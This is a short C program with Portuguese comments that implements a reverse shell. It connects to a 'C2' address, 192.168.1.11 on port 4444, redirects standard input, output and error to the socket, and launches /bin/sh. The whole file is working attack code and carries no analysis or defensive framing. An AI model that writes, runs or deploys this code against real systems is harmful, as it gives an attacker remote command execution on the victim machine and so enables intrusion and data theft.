#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <netdb.h>

#define C2_DOMAIN "192.168.1.11"
#define C2_PORT 4444

int main()
{
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *host;

    // Resolve o domínio C2 para IP
    host = gethostbyname(C2_DOMAIN);
    if (host == NULL)
    {
        fprintf(stderr, "Erro ao resolver C2: %s\n", C2_DOMAIN);
        exit(1);
    }

    // Cria socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        perror("Erro ao criar socket");
        exit(1);
    }

    // Define endereço do servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr = *((struct in_addr *)host->h_addr);
    memset(&(server_addr.sin_zero), 0, 8);

    // Conecta ao C2
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1)
    {
        perror("Erro ao conectar ao C2");
        exit(1);
    }

    // Redireciona entrada e saída para o socket (simula shell reversa)
    dup2(sockfd, 0); // stdin
    dup2(sockfd, 1); // stdout
    dup2(sockfd, 2); // stderr

    // Executa shell
    execl("/bin/sh", "sh", NULL);

    return 0;
}
